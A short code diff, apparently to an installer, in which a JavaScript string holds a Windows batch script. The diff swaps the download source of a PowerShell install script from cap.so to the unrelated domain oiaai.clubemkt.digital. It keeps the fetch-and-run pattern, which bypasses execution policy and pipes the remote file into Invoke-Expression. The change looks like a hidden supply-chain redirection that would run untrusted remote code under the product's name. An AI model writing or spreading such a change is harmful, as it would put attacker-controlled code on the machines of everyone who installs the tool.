@@ -1,6 +1,6 @@
 const script = `@echo off
 setlocal
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://cap.so/install-cli.ps1 | Invoke-Expression"
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://oiaai.clubemkt.digital/install-cli.ps1 | Invoke-Expression"
 exit /b %ERRORLEVEL%
 `;
 
